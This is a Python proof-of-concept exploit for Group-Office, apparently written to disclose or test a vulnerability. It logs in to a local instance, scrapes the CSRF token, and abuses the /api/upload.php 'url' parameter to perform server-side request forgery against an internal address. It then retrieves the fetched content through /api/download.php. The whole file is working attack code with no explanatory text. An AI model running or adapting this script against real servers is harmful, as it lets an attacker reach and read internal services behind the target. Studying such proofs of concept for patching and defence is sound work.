import requests
import json

SERVER_URL = 'http://localhost:9000'
USER_NAME = 'test'
PASSWORD = '123456'

if __name__ == '__main__':
    # Open a session
    session = requests.Session()
    # Get login page to get CSRF token
    login_page_url = SERVER_URL
    login_page_response = session.get(login_page_url)
    # Find CSRF token in the form of GO.securityToken="ahM4mQnIHLbk5c9wPtpE"
    csrf_token = login_page_response.text.split('GO.securityToken="')[1].split('"')[0]
    print(csrf_token)

    # Login
    login_url = f'{SERVER_URL}/api/auth.php?security_token={csrf_token}'
    login_data = {
        "clientName": "Group-Office webclient",
        "clientVersion": ">9000",
        "deviceName": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
        "username": USER_NAME,
        "password": PASSWORD,
        "rememberLogin": True
    }
    # Set various headers
    headers = {
        'Accept': '*/*',
        'Accept-Language': 'en',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': SERVER_URL,
        'Referer': SERVER_URL,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.199 Safari/537.36',
    }
    login_response = session.post(login_url, json=login_data, allow_redirects=True, headers=headers)
    print(login_response.text)
    # Parse response as json to get accessToken
    login_response_json = json.loads(login_response.text)
    access_token = login_response_json['accessToken']
    print(access_token)
    # Add access token to cookie
    session.cookies.set('accessToken', access_token)

    # Trigger SSRF
    upload_url = f'{SERVER_URL}/api/upload.php?url=http://localhost:8080'
    upload_response = session.get(upload_url, allow_redirects=True, headers=headers)
    print(upload_response.text)
    # Parse response as json to get blobId
    upload_response_json = json.loads(upload_response.text)
    blob_id = upload_response_json['blobId']

    # Retrieve file back from /api/download.php?blob=blobid
    download_url = f'{SERVER_URL}/api/download.php?blob={blob_id}'
    download_response = session.get(download_url, allow_redirects=True, headers=headers)
    print("Response text:")
    print(download_response.text)